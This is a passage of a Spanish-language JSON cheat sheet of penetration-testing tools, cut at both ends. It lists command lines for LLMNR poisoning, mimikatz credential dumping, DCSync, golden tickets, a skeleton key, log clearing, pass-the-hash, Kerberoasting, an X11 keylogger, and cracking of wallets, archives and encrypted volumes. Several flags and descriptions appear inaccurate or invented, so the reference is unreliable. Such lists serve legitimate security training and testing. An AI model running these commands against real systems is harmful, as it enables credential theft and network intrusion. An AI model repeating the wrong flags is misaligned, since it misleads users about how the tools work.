    "cmd": "grep -i admin /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt",
    "desc": "Buscar admin"
   },
   {
    "cmd": "wc -l /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
    "desc": "Subdominios top"
   },
   {
    "cmd": "head -50 /usr/share/seclists/Discovery/Web-Content/common.txt",
    "desc": "Ver common.txt"
   },
   {
    "cmd": "find /usr/share/seclists -name '*burp*'",
    "desc": "Buscar wordlists burp"
   }
  ]
 },
 {
  "tool": "responder",
  "desc": "Envenenador LLMNR/NBT-NS/mDNS para capturar hashes NTLMv2",
  "commands": [
   {
    "cmd": "responder -I eth0",
    "desc": "Envenenar en la interfaz"
   },
   {
    "cmd": "sudo responder -I eth0 -v",
    "desc": "Verbose"
   },
   {
    "cmd": "sudo responder -I eth0 -wv",
    "desc": "Verbose con WPAD"
   },
   {
    "cmd": "sudo responder -I eth0 -w",
    "desc": "Con WPAD"
   },
   {
    "cmd": "sudo responder -I eth0 -F",
    "desc": "Forzar WPAD auth"
   },
   {
    "cmd": "sudo responder -I eth0 -f",
    "desc": "Fingerprint de OS"
   },
   {
    "cmd": "sudo responder -I eth0 -u",
    "desc": "Modo up"
   },
   {
    "cmd": "sudo responder -I eth0 -r",
    "desc": "Respuestas random"
   },
   {
    "cmd": "sudo responder -I eth0 -b",
    "desc": "Desactivar llmnr"
   },
   {
    "cmd": "sudo responder -I eth0 -A",
    "desc": "Solo análisis (no envenenar)"
   },
   {
    "cmd": "sudo responder -I eth0 -l PDC",
    "desc": "Modo PDC"
   },
   {
    "cmd": "sudo responder -I eth0 -i 192.168.1.100",
    "desc": "IP de la interfaz"
   },
   {
    "cmd": "sudo responder -I eth0 --lm",
    "desc": "Forzar hash LM"
   },
   {
    "cmd": "sudo responder -I eth0 -P",
    "desc": "Modo proxy"
   },
   {
    "cmd": "sudo responder -I eth0 -d",
    "desc": "DHCP"
   },
   {
    "cmd": "responder -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "mimikatz",
  "desc": "Extracción de credenciales en Windows (memory, SAM, LSASS)",
  "commands": [
   {
    "cmd": "mimikatz.exe",
    "desc": "Abrir consola"
   },
   {
    "cmd": "mimikatz.exe privilege::debug",
    "desc": "Activar privilegio debug"
   },
   {
    "cmd": "mimikatz.exe sekurlsa::logonpasswords",
    "desc": "Credenciales de sesión"
   },
   {
    "cmd": "mimikatz.exe sekurlsa::msv",
    "desc": "Hashes MSV"
   },
   {
    "cmd": "mimikatz.exe sekurlsa::wdigest",
    "desc": "Passwords wdigest"
   },
   {
    "cmd": "mimikatz.exe lsadump::sam",
    "desc": "Dump del SAM"
   },
   {
    "cmd": "mimikatz.exe lsadump::cache",
    "desc": "Dump de cache"
   },
   {
    "cmd": "mimikatz.exe lsadump::secrets",
    "desc": "Secretos LSA"
   },
   {
    "cmd": "mimikatz.exe lsadump::lsa /patch",
    "desc": "Dump LSA inyectando"
   },
   {
    "cmd": "mimikatz.exe lsadump::dcsync /domain:dom.local /user:krbtgt",
    "desc": "DCSync krbtgt"
   },
   {
    "cmd": "mimikatz.exe lsadump::dcsync /domain:dom.local /all",
    "desc": "DCSync todo"
   },
   {
    "cmd": "mimikatz.exe kerberos::list",
    "desc": "Tickets Kerberos"
   },
   {
    "cmd": "mimikatz.exe kerberos::ptt ticket.kirbi",
    "desc": "Pass the ticket"
   },
   {
    "cmd": "mimikatz.exe kerberos::golden /user:admin /domain:dom.local /sid:S-1-5-21-... /krbtgt:HASH",
    "desc": "Golden ticket"
   },
   {
    "cmd": "mimikatz.exe kerberos::golden /user:admin /domain:dom.local /sid:S-1-5-21-... /krbtgt:HASH /ptt",
    "desc": "Golden ticket + inyectar"
   },
   {
    "cmd": "mimikatz.exe kerberos::golden /user:admin /domain:dom.local /sid:... /rc4:HASH /ptt /admin",
    "desc": "Golden con rc4"
   },
   {
    "cmd": "mimikatz.exe crypto::certificates /systemstore:LOCAL_MACHINE",
    "desc": "Certificados"
   },
   {
    "cmd": "mimikatz.exe dpapi::chrome /in:\"C:\\Users\\user\\AppData\\...\\Login Data\"",
    "desc": "Chrome DPAPI"
   },
   {
    "cmd": "mimikatz.exe dpapi::cred /in:cred_file",
    "desc": "Credenciales DPAPI"
   },
   {
    "cmd": "mimikatz.exe token::elevate",
    "desc": "Elevar token"
   },
   {
    "cmd": "mimikatz.exe token::revert",
    "desc": "Revertir token"
   },
   {
    "cmd": "mimikatz.exe privilege::token",
    "desc": "Privilegios del token"
   },
   {
    "cmd": "mimikatz.exe lsadump::sam /system:SYSTEM /sam:SAM",
    "desc": "Offline SAM"
   },
   {
    "cmd": "mimikatz.exe vault::list",
    "desc": "Vault de Windows"
   },
   {
    "cmd": "mimikatz.exe vault::cred /patch",
    "desc": "Credenciales vault"
   },
   {
    "cmd": "mimikatz.exe sekurlsa::pth /user:admin /domain:dom /ntlm:HASH /run:cmd.exe",
    "desc": "Pass the hash"
   },
   {
    "cmd": "mimikatz.exe misc::skeleton",
    "desc": "Skeleton key"
   },
   {
    "cmd": "mimikatz.exe event::drop",
    "desc": "Limpiar logs"
   },
   {
    "cmd": "mimikatz.exe log mimikatz.log",
    "desc": "Guardar log"
   }
  ]
 },
 {
  "tool": "rubeus",
  "desc": "Toolkit Kerberos (Kerberoasting, AS-REP, pass-the-ticket)",
  "commands": [
   {
    "cmd": "Rubeus.exe kerberoast /outfile:hashes.txt",
    "desc": "Kerberoasting"
   },
   {
    "cmd": "Rubeus.exe kerberoast /stats",
    "desc": "Estadísticas SPNs"
   },
   {
    "cmd": "Rubeus.exe kerberoast /outfile:hashes.txt /spn:\"MSSQL/svc\"",
    "desc": "SPN específico"
   },
   {
    "cmd": "Rubeus.exe asreproast /outfile:hashes.txt",
    "desc": "AS-REP roast"
   },
   {
    "cmd": "Rubeus.exe asktgt /user:admin /rc4:HASH /ptt",
    "desc": "Ask TGT + inject"
   },
   {
    "cmd": "Rubeus.exe asktgt /user:admin /password:pass /ptt",
    "desc": "TGT con password"
   },
   {
    "cmd": "Rubeus.exe s4u /user:svc /rc4:HASH /impersonateuser:admin /msdsspn:cifs/target.local /ptt",
    "desc": "S4U impersonation"
   },
   {
    "cmd": "Rubeus.exe dump /nowrap",
    "desc": "Dump de tickets"
   },
   {
    "cmd": "Rubeus.exe triage",
    "desc": "Tickets activos"
   },
   {
    "cmd": "Rubeus.exe ptt /ticket:base64",
    "desc": "Pass the ticket"
   },
   {
    "cmd": "Rubeus.exe ptt /ticket:file.kirbi",
    "desc": "PtT desde archivo"
   },
   {
    "cmd": "Rubeus.exe renew /ticket:...",
    "desc": "Renovar ticket"
   },
   {
    "cmd": "Rubeus.exe describe /ticket:...",
    "desc": "Describir ticket"
   },
   {
    "cmd": "Rubeus.exe monitor /interval:30",
    "desc": "Monitorizar tickets"
   },
   {
    "cmd": "Rubeus.exe harvest /interval:30",
    "desc": "Cosechar tickets"
   },
   {
    "cmd": "Rubeus.exe changepw /user:user /old:old /new:new",
    "desc": "Cambiar password"
   },
   {
    "cmd": "Rubeus.exe hash /domain:dom /user:user /password:pass",
    "desc": "Calcular hashes"
   },
   {
    "cmd": "Rubeus.exe createnetonly /program:c:\\windows\\system32\\cmd.exe /show",
    "desc": "Proceso logon-only"
   }
  ]
 },
 {
  "tool": "samdump2",
  "desc": "Extraer hashes NTLM del archivo SAM",
  "commands": [
   {
    "cmd": "samdump2 SYSTEM SAM",
    "desc": "Extraer hashes de SAM"
   },
   {
    "cmd": "samdump2 -o hashes.txt SYSTEM SAM",
    "desc": "Guardar en archivo"
   },
   {
    "cmd": "samdump2 -d SYSTEM SAM",
    "desc": "Con detalle"
   },
   {
    "cmd": "samdump2 -h",
    "desc": "Ayuda"
   },
   {
    "cmd": "samdump2 SYSTEM SAM | john --format=nt -",
    "desc": "Pipe directo a John"
   }
  ]
 },
 {
  "tool": "creddump7",
  "desc": "Dump de credenciales desde volcados de memoria",
  "commands": [
   {
    "cmd": "pwdump.py SYSTEM SAM",
    "desc": "Pwdump del SAM"
   },
   {
    "cmd": "pwdump.py -d SYSTEM SAM",
    "desc": "Con detalle"
   },
   {
    "cmd": "lsadump.py SYSTEM SECURITY",
    "desc": "Dump LSA"
   },
   {
    "cmd": "cachedump.py SYSTEM SECURITY",
    "desc": "Cache de credenciales"
   },
   {
    "cmd": "pwdump.py SYSTEM SAM > hashes.txt",
    "desc": "Guardar"
   }
  ]
 },
 {
  "tool": "chntpw2",
  "desc": "Reset de contraseñas de cuentas locales Windows",
  "commands": [
   {
    "cmd": "chntpw -u admin SAM",
    "desc": "Resetear admin"
   },
   {
    "cmd": "chntpw -l SAM",
    "desc": "Listar usuarios"
   },
   {
    "cmd": "chntpw -d SAM",
    "desc": "Debug"
   },
   {
    "cmd": "chntpw -e SAM",
    "desc": "Editor de registro"
   }
  ]
 },
 {
  "tool": "gpp-decrypt",
  "desc": "Descifrar contraseñas GPP (cpassword) de Group Policy",
  "commands": [
   {
    "cmd": "gpp-decrypt 'cpassword_encrypted'",
    "desc": "Descifrar cpassword"
   },
   {
    "cmd": "gpp-decrypt -f groups.xml",
    "desc": "Desde archivo XML"
   },
   {
    "cmd": "gpp-decrypt -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "kerberoast",
  "desc": "Conjunto de scripts para ataques Kerberos",
  "commands": [
   {
    "cmd": "GetUserSPNs.py dom/user:pass -dc-ip DC_IP -request",
    "desc": "Solicitar TGS"
   },
   {
    "cmd": "GetUserSPNs.py dom/user:pass -dc-ip DC_IP -request -outputfile hashes.txt",
    "desc": "Guardar hashes"
   },
   {
    "cmd": "GetUserSPNs.py dom/user -dc-ip DC_IP -usersfile users.txt -no-pass",
    "desc": "Enumerar SPNs"
   },
   {
    "cmd": "GetNPUsers.py dom/user:pass -dc-ip DC_IP -request",
    "desc": "AS-REP"
   },
   {
    "cmd": "GetNPUsers.py dom/ -usersfile users.txt -no-pass -dc-ip DC_IP",
    "desc": "AS-REP sin credenciales"
   },
   {
    "cmd": "tgsrepcrack.py wordlist.txt hashes.txt",
    "desc": "Crackear TGS"
   },
   {
    "cmd": "tgsrepcrack.py rockyou.txt krb5tgs.txt",
    "desc": "Crack con rockyou"
   },
   {
    "cmd": "kerberoast.py -o hashes.txt",
    "desc": "Alternativa"
   }
  ]
 },
 {
  "tool": "krbrelayx",
  "desc": "Herramientas de relay de Kerberos (printerbug, etc)",
  "commands": [
   {
    "cmd": "printerbug.py dom/user:pass@TARGET IP_ATACANTE",
    "desc": "Printerbug (coerción)"
   },
   {
    "cmd": "dnstool.py dom/user:pass -action add -record x -data IP TARGET",
    "desc": "Añadir registro DNS"
   },
   {
    "cmd": "dnstool.py dom/user:pass -action query -record x TARGET",
    "desc": "Consultar DNS"
   },
   {
    "cmd": "krbrelayx.py -t TARGET -c 'whoami'",
    "desc": "Relay Kerberos"
   },
   {
    "cmd": "addspn.py dom/user:pass -u admin -s SPN TARGET",
    "desc": "Añadir SPN"
   },
   {
    "cmd": "autoaddcomputer.py dom/user:pass -dc-ip DC -computer-name PC -computer-pass pass",
    "desc": "Añadir computadora"
   },
   {
    "cmd": "getnthash.py dom/user:pass -spn cifs/target -dc-ip DC",
    "desc": "Obtener hash NT"
   }
  ]
 },
 {
  "tool": "evil-winrm",
  "desc": "Shell WinRM para pentesting (con upload/download y bypass)",
  "commands": [
   {
    "cmd": "evil-winrm -i 192.168.1.10 -u admin -p pass",
    "desc": "Conectar con credenciales"
   },
   {
    "cmd": "evil-winrm -i 192.168.1.10 -u admin -H NTLM_HASH",
    "desc": "Pass-the-hash"
   },
   {
    "cmd": "evil-winrm -i 192.168.1.10 -u admin -p pass -P 5986",
    "desc": "Puerto HTTPS 5986"
   },
   {
    "cmd": "evil-winrm -i 192.168.1.10 -u admin -p pass -s /tmp/scripts",
    "desc": "Scripts locales"
   },
   {
    "cmd": "evil-winrm -i 192.168.1.10 -u admin -p pass -e /tmp/exe",
    "desc": "Ejecutables locales"
   },
   {
    "cmd": "evil-winrm -i 192.168.1.10 -u admin -p pass -x 'whoami'",
    "desc": "Ejecutar comando directo"
   },
   {
    "cmd": "evil-winrm -i 192.168.1.10 -u admin -p pass -c 'Invoke-Mimikatz'",
    "desc": "Ejecutar comando PS"
   },
   {
    "cmd": "evil-winrm -i 192.168.1.10 -u admin -p pass -u",
    "desc": "Modo usuario"
   },
   {
    "cmd": "evil-winrm -i 192.168.1.10 -u admin -H HASH -k key.pem",
    "desc": "Con cert"
   },
   {
    "cmd": "evil-winrm -i 192.168.1.10 -u admin -p pass -l out.log",
    "desc": "Log"
   },
   {
    "cmd": "evil-winrm -i 192.168.1.10 -u admin -p pass -V",
    "desc": "Versión"
   }
  ]
 },
 {
  "tool": "evil-winrm-py",
  "desc": "Versión Python pura de Evil-WinRM",
  "commands": [
   {
    "cmd": "evil-winrm-py -i 192.168.1.10 -u admin -p pass",
    "desc": "Conectar"
   },
   {
    "cmd": "evil-winrm-py -i 192.168.1.10 -u admin -H HASH",
    "desc": "Pass-the-hash"
   },
   {
    "cmd": "evil-winrm-py -i 192.168.1.10 -u admin -p pass -c 'whoami'",
    "desc": "Comando directo"
   },
   {
    "cmd": "evil-winrm-py --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "trufflehog",
  "desc": "Detectar secretos en repositorios y archivos",
  "commands": [
   {
    "cmd": "trufflehog git https://github.com/user/repo",
    "desc": "Escanear repo"
   },
   {
    "cmd": "trufflehog git file:///ruta/local",
    "desc": "Repo local"
   },
   {
    "cmd": "trufflehog github --org=orgname",
    "desc": "Organización GitHub"
   },
   {
    "cmd": "trufflehog filesystem --directory=/ruta",
    "desc": "Sistema de archivos"
   },
   {
    "cmd": "trufflehog git --only-verified URL",
    "desc": "Solo verificados"
   },
   {
    "cmd": "trufflehog git --json URL",
    "desc": "Salida JSON"
   },
   {
    "cmd": "trufflehog git --since-commit HASH URL",
    "desc": "Desde commit"
   },
   {
    "cmd": "trufflehog git --branch dev URL",
    "desc": "Rama específica"
   },
   {
    "cmd": "trufflehog s3 --bucket=bucket",
    "desc": "Bucket S3"
   },
   {
    "cmd": "trufflehog docker --image=imagen:tag",
    "desc": "Imagen Docker"
   }
  ]
 },
 {
  "tool": "gitxray",
  "desc": "Analizar metadatos y secretos en repositorios Git públicos",
  "commands": [
   {
    "cmd": "gitxray -d objetivo.com",
    "desc": "Analizar dominio"
   },
   {
    "cmd": "gitxray -d objetivo.com -o out.txt",
    "desc": "Guardar resultados"
   },
   {
    "cmd": "gitxray -d objetivo.com -v",
    "desc": "Verbose"
   },
   {
    "cmd": "gitxray -d objetivo.com -a",
    "desc": "Análisis avanzado"
   },
   {
    "cmd": "gitxray -d objetivo.com -j",
    "desc": "Salida JSON"
   },
   {
    "cmd": "gitxray --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "sprayhound",
  "desc": "Password spraying con recolección de datos (SprayHound)",
  "commands": [
   {
    "cmd": "sprayhound -d dom.local -u user -p 'Password'",
    "desc": "Spray simple"
   },
   {
    "cmd": "sprayhound -d dom.local -u users.txt -p passwords.txt",
    "desc": "Spray con lists"
   },
   {
    "cmd": "sprayhound -d dom.local -u user -p pass -x",
    "desc": "Solo pruebas"
   },
   {
    "cmd": "sprayhound -d dom.local -u user -p pass -o out.txt",
    "desc": "Guardar"
   },
   {
    "cmd": "sprayhound -d dom.local -u user -p pass --delay 5",
    "desc": "Delay de 5 min"
   },
   {
    "cmd": "sprayhound -d dom.local -u user -p pass -v",
    "desc": "Verbose"
   }
  ]
 },
 {
  "tool": "cmospwd",
  "desc": "Recuperar contraseñas del CMOS/BIOS",
  "commands": [
   {
    "cmd": "cmospwd -w",
    "desc": "Escribir en CMOS"
   },
   {
    "cmd": "cmospwd -r",
    "desc": "Leer CMOS"
   },
   {
    "cmd": "cmospwd -d",
    "desc": "Debug"
   },
   {
    "cmd": "cmospwd -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "ophcrack",
  "desc": "Crackear contraseñas LM/NTLM con tablas rainbow",
  "commands": [
   {
    "cmd": "ophcrack -d hashes.txt",
    "desc": "Crackear desde archivo"
   },
   {
    "cmd": "ophcrack -t table_path hashes.txt",
    "desc": "Con tablas rainbow"
   },
   {
    "cmd": "ophcrack -d hashes.txt -o out.txt",
    "desc": "Guardar"
   },
   {
    "cmd": "ophcrack -g",
    "desc": "Modo gráfico"
   },
   {
    "cmd": "ophcrack -c config.xml",
    "desc": "Con config"
   },
   {
    "cmd": "ophcrack-cli -d hashes.txt",
    "desc": "CLI"
   }
  ]
 },
 {
  "tool": "rainbowcrack",
  "desc": "Crackeo con tablas rainbow (rcrack)",
  "commands": [
   {
    "cmd": "rcrack tables/ -h HASH",
    "desc": "Crackear hash"
   },
   {
    "cmd": "rcrack tables/ -l hashes.txt",
    "desc": "Crackear lista"
   },
   {
    "cmd": "rcrack -f tables_dir -n 8 hashes.txt",
    "desc": "Con nº de procesos"
   },
   {
    "cmd": "rcrack tables/ -h HASH -v",
    "desc": "Verbose"
   },
   {
    "cmd": "rtgen md5 numeric 1 7 0 1000 0",
    "desc": "Generar tabla md5 numeric"
   },
   {
    "cmd": "rtsort tabla.rt",
    "desc": "Ordenar tabla"
   },
   {
    "cmd": "rt2rt -s out.bin tabla.rt",
    "desc": "Conversión de formato"
   }
  ]
 },
 {
  "tool": "fcrackzip",
  "desc": "Crackear contraseñas de archivos ZIP",
  "commands": [
   {
    "cmd": "fcrackzip -D -p rockyou.txt file.zip",
    "desc": "Diccionario"
   },
   {
    "cmd": "fcrackzip -b -c a1 -l 1-6 file.zip",
    "desc": "Brute force alfanumérico"
   },
   {
    "cmd": "fcrackzip -b -c 'aA1!' -l 4-8 file.zip",
    "desc": "Charset custom"
   },
   {
    "cmd": "fcrackzip -u file.zip",
    "desc": "Test por descompresión"
   },
   {
    "cmd": "fcrackzip -v file.zip",
    "desc": "Verbose"
   },
   {
    "cmd": "fcrackzip -D -u -p rockyou.txt file.zip",
    "desc": "Diccionario + test"
   },
   {
    "cmd": "fcrackzip -b -c '1' -l 6 file.zip",
    "desc": "Solo números 6 dígitos"
   },
   {
    "cmd": "fcrackzip -D -p pass.txt -u file.zip",
    "desc": "Con usuario"
   }
  ]
 },
 {
  "tool": "pdfcrack",
  "desc": "Crackear contraseñas de PDF",
  "commands": [
   {
    "cmd": "pdfcrack file.pdf -w rockyou.txt",
    "desc": "Diccionario"
   },
   {
    "cmd": "pdfcrack file.pdf -c 'a-z'",
    "desc": "Charset minúsculas"
   },
   {
    "cmd": "pdfcrack file.pdf -n 4 -m 8",
    "desc": "Longitud 4-8"
   },
   {
    "cmd": "pdfcrack file.pdf -a",
    "desc": "Modo todos los usuarios"
   },
   {
    "cmd": "pdfcrack file.pdf -b",
    "desc": "Solo owner password"
   },
   {
    "cmd": "pdfcrack file.pdf -e out.txt",
    "desc": "Guardar"
   },
   {
    "cmd": "pdfcrack file.pdf -w rockyou.txt -p admin",
    "desc": "Prefijo admin"
   },
   {
    "cmd": "pdfcrack file.pdf -W rockyou.txt",
    "desc": "Wordlist con minúsculas"
   }
  ]
 },
 {
  "tool": "zipcracker",
  "desc": "Cracker de ZIP con fuerza bruta",
  "commands": [
   {
    "cmd": "zipcracker -f file.zip -w rockyou.txt",
    "desc": "Diccionario"
   },
   {
    "cmd": "zipcracker -f file.zip -b -l 6",
    "desc": "Brute 6 chars"
   },
   {
    "cmd": "zipcracker -f file.zip -a 'abcdef'",
    "desc": "Alfabeto custom"
   },
   {
    "cmd": "zipcracker -f file.zip -c",
    "desc": "Comprobación rápida"
   },
   {
    "cmd": "zipcracker -f file.zip -o out.txt",
    "desc": "Salida"
   }
  ]
 },
 {
  "tool": "crackle",
  "desc": "Crackear conexiones Bluetooth BLE (BR/EDR)",
  "commands": [
   {
    "cmd": "crackle -i capture.pcapng -o out.txt",
    "desc": "Analizar captura"
   },
   {
    "cmd": "crackle -i cap.pcapng -l 5",
    "desc": "Longitud PIN"
   },
   {
    "cmd": "crackle -i cap.pcapng -v",
    "desc": "Verbose"
   },
   {
    "cmd": "crackle -i cap.pcapng -s",
    "desc": "Silencioso"
   },
   {
    "cmd": "crackle --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "truecrack",
  "desc": "Crackear volúmenes TrueCrypt",
  "commands": [
   {
    "cmd": "truecrack -t file.tc -w rockyou.txt",
    "desc": "Diccionario"
   },
   {
    "cmd": "truecrack -t file.tc -w rockyou.txt --verbose",
    "desc": "Verbose"
   },
   {
    "cmd": "truecrack -t file.tc -b",
    "desc": "Brute force"
   },
   {
    "cmd": "truecrack -t file.tc -k keyfile",
    "desc": "Con keyfile"
   },
   {
    "cmd": "truecrack -t file.tc -w rockyou.txt -o out.txt",
    "desc": "Guardar"
   },
   {
    "cmd": "truecrack -t file.tc --hash=NTLM",
    "desc": "Hash mode"
   }
  ]
 },
 {
  "tool": "bruteforce-luks",
  "desc": "Fuerza bruta de volúmenes LUKS",
  "commands": [
   {
    "cmd": "bruteforce-luks -f rockyou.txt file.luks",
    "desc": "Diccionario"
   },
   {
    "cmd": "bruteforce-luks -b 10 file.luks",
    "desc": "Brute de 10 chars"
   },
   {
    "cmd": "bruteforce-luks -c 'abcdef' -l 4 file.luks",
    "desc": "Charset y longitud"
   },
   {
    "cmd": "bruteforce-luks -s 5 -f rockyou.txt file.luks",
    "desc": "Delay de 5s"
   },
   {
    "cmd": "bruteforce-luks -v -f rockyou.txt file.luks",
    "desc": "Verbose"
   },
   {
    "cmd": "bruteforce-luks -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "bruteforce-salted-openssl",
  "desc": "Fuerza bruta de archivos cifrados con OpenSSL",
  "commands": [
   {
    "cmd": "bruteforce-salted-openssl -f rockyou.txt -t file.enc -c aes-256-cbc",
    "desc": "Diccionario AES"
   },
   {
    "cmd": "bruteforce-salted-openssl -f rockyou.txt -t file.enc -c aes-128-cbc -s sha256",
    "desc": "Con digest"
   },
   {
    "cmd": "bruteforce-salted-openssl -b 4 -t file.enc",
    "desc": "Brute 4 chars"
   },
   {
    "cmd": "bruteforce-salted-openssl -d -f rockyou.txt -t file.enc",
    "desc": "Detectar cifrado"
   },
   {
    "cmd": "bruteforce-salted-openssl -v -f rockyou.txt -t file.enc",
    "desc": "Verbose"
   }
  ]
 },
 {
  "tool": "bruteforce-wallet",
  "desc": "Fuerza bruta de wallets de criptomonedas (bitcoin, etc)",
  "commands": [
   {
    "cmd": "bruteforce-wallet -f rockyou.txt -t wallet.dat",
    "desc": "Bitcoin wallet"
   },
   {
    "cmd": "bruteforce-wallet -f rockyou.txt -t wallet.dat -s litecoin",
    "desc": "Litecoin"
   },
   {
    "cmd": "bruteforce-wallet -b -t wallet.dat",
    "desc": "Brute force"
   },
   {
    "cmd": "bruteforce-wallet -f rockyou.txt -t wallet.dat -o pass.txt",
    "desc": "Guardar"
   },
   {
    "cmd": "bruteforce-wallet -v -f rockyou.txt -t wallet.dat",
    "desc": "Verbose"
   }
  ]
 },
 {
  "tool": "sucrack",
  "desc": "Fuerza bruta de su (concurrente)",
  "commands": [
   {
    "cmd": "sucrack -w rockyou.txt",
    "desc": "Diccionario para su"
   },
   {
    "cmd": "sucrack -u user -w rockyou.txt",
    "desc": "Usuario específico"
   },
   {
    "cmd": "sucrack -t 10 -w rockyou.txt",
    "desc": "10 hilos"
   },
   {
    "cmd": "sucrack -l 100 -w rockyou.txt",
    "desc": "Máximo de logins"
   },
   {
    "cmd": "sucrack -w rockyou.txt -s",
    "desc": "Silencioso"
   },
   {
    "cmd": "sucrack -v -w rockyou.txt",
    "desc": "Verbose"
   }
  ]
 },
 {
  "tool": "sipcrack",
  "desc": "Crackear autenticación SIP (VoIP)",
  "commands": [
   {
    "cmd": "sipcrack -w rockyou.txt capture.pcap",
    "desc": "Diccionario"
   },
   {
    "cmd": "sipcrack -w rockyou.txt -s 100 capture.pcap",
    "desc": "Salt de 100"
   },
   {
    "cmd": "sipcrack -w rockyou.txt -v capture.pcap",
    "desc": "Verbose"
   },
   {
    "cmd": "sipdump capture.pcap",
    "desc": "Extraer credenciales"
   },
   {
    "cmd": "sipdump -p 5060 capture.pcap",
    "desc": "Puerto SIP"
   }
  ]
 },
 {
  "tool": "svcrack",
  "desc": "Cracker de extensiones SIP (SIPVicious)",
  "commands": [
   {
    "cmd": "svcrack -u 100 -r 200 192.168.1.10",
    "desc": "Crackear rango de extensiones"
   },
   {
    "cmd": "svcrack -u 100 -r 110 -p rockyou.txt 192.168.1.10",
    "desc": "Con diccionario"
   },
   {
    "cmd": "svcrack -d -u 100 -r 110 192.168.1.10",
    "desc": "Modo debug"
   },
   {
    "cmd": "svcrack -u 100 -r 110 -P 5060 192.168.1.10",
    "desc": "Puerto SIP"
   }
  ]
 },
 {
  "tool": "enumiax",
  "desc": "Enumerar extensiones en servidores IAX (Asterisk)",
  "commands": [
   {
    "cmd": "enumiax -u 100 -r 200 -p 4569 192.168.1.10",
    "desc": "Enumerar rango"
   },
   {
    "cmd": "enumiax -d -u 100 -r 110 192.168.1.10",
    "desc": "Debug"
   },
   {
    "cmd": "enumiax -v -u 100 -r 110 192.168.1.10",
    "desc": "Verbose"
   },
   {
    "cmd": "enumiax -u 100 -r 110 -m 2 192.168.1.10",
    "desc": "Concurrente"
   }
  ]
 },
 {
  "tool": "xspy",
  "desc": "Keylogger en X11 (Linux) para capturar teclas",
  "commands": [
   {
    "cmd": "xspy -d :0",
    "desc": "Capturar en display :0"
   },
   {
    "cmd": "xspy -d :0 -l",
    "desc": "Log a archivo"
   },
   {
    "cmd": "xspy -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "mfcuk",
  "desc": "Ataques a tarjetas MIFARE Classic (nested, Darkside)",
  "commands": [
   {
    "cmd": "mfcuk -C -R -S -v 2",
    "desc": "Ataque Darkside"
   },
   {
    "cmd": "mfcuk -C -R -S -v 3 -s 4",
    "desc": "Nested attack"
   },
   {
    "cmd": "mfcuk -C -R -S -o keys.txt",
    "desc": "Guardar keys"
   },
   {
    "cmd": "mfcuk -h",
    "desc": "Ayuda"
   },
   {
    "cmd": "mfcuk -C -R -S -v 1 -s 1",
    "desc": "Bajo verbose"
   }
  ]
 },
 {
  "tool": "mfoc",
  "desc": "Recuperar keys de MIFARE Classic con nested attack",
  "commands": [
   {
    "cmd": "mfoc -O dump.mfd",
    "desc": "Dump de tarjeta"
   },
   {
    "cmd": "mfoc -O dump.mfd -k key",
    "desc": "Con key conocida"
   },
   {
    "cmd": "mfoc -O dump.mfd -f keys.txt",
    "desc": "Con archivo de keys"
   },
   {
    "cmd": "mfoc -O dump.mfd -T 50",
    "desc": "Timeout"
   },
   {
    "cmd": "mfoc -O dump.mfd -v",
    "desc": "Verbose"
   }
  ]
 },
 {
  "tool": "mfterm",
  "desc": "Terminal interactiva para tarjetas MIFARE",
  "commands": [
   {
    "cmd": "mfterm",
    "desc": "Abrir terminal"
   },
   {
    "cmd": "mfterm -h",
    "desc": "Ayuda"
   },
   {
    "cmd": "mfterm -r dump.mfd",
    "desc": "Leer dump"
   }
  ]
 },
 {
  "tool": "libfreefare",
  "desc": "Herramientas para tarjetas NFC (MIFARE, DESFire)",
  "commands": [
   {
    "cmd": "mifare-classic-format -k KEY -d dump.mfd",
    "desc": "Formatear tarjeta"
   },
   {
    "cmd": "mifare-classic-read-ndef -k KEY",
    "desc": "Leer NDEF"
   },
   {
    "cmd": "mifare-classic-write-ndef -k KEY -d data",
    "desc": "Escribir NDEF"
   },
   {
    "cmd": "mifare-desfire-info",
    "desc": "Info DESFire"
   },
   {
    "cmd": "mifare-desfire-create-application",
    "desc": "Crear aplicación"
   },
   {
    "cmd": "mifare-desfire-write",
    "desc": "Escribir data"
   },
   {
    "cmd": "nfc-mfclassic R A dump.mfd",
    "desc": "Leer con libnfc"
   },
   {
    "cmd": "nfc-list",
    "desc": "Listar dispositivos NFC"
   }
  ]
 },
 {
  "tool": "office2john",
  "desc": "Extraer hash de documentos Office (john)",
  "commands": [
   {
    "cmd": "office2john documento.docx",
    "desc": "Hash docx"
   },
   {
    "cmd": "office2john documento.xlsx",
    "desc": "Hash xlsx"
   },
   {
    "cmd": "office2john documento.pptx",
    "desc": "Hash pptx"
   },
   {
    "cmd": "office2john viejo.doc",
    "desc": "Hash doc legacy"
   },
   {
    "cmd": "office2john -m docx.docx",
    "desc": "Con nombre"
   },
   {
    "cmd": "office2john -c calc.xlsx",
    "desc": "Formula"
   },
   {
    "cmd": "office2john -e aes.docx",
    "desc": "Encryption"
   },
   {
    "cmd": "office2john -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "rar2john",
  "desc": "Extraer hash de archivos RAR",
  "commands": [
   {
    "cmd": "rar2john archivo.rar",
    "desc": "Hash rar"
   },
   {
    "cmd": "rar2john -a archivo.rar",
    "desc": "Ambos formatos"
   },
   {
    "cmd": "rar2john -p archivo.rar",
    "desc": "Solo password"
   },
   {
    "cmd": "rar2john -o out.txt archivo.rar",
    "desc": "Salida"
   },
   {
    "cmd": "rar2john -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "keepass2john",
  "desc": "Extraer hash de bases Keepass",
  "commands": [
   {
    "cmd": "keepass2john database.kdbx",
    "desc": "Hash kdbx"
   },
   {
    "cmd": "keepass2john -k database.kdbx",
    "desc": "Con keyfile"
   },
   {
    "cmd": "keepass2john -o out.txt database.kdbx",
    "desc": "Salida"
   },
   {
    "cmd": "keepass2john -a database.kdbx",
    "desc": "Todas las claves"
   },
   {
    "cmd": "keepass2john -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "wlan2john",
  "desc": "Convertir capturas WiFi a formato john",
  "commands": [
   {
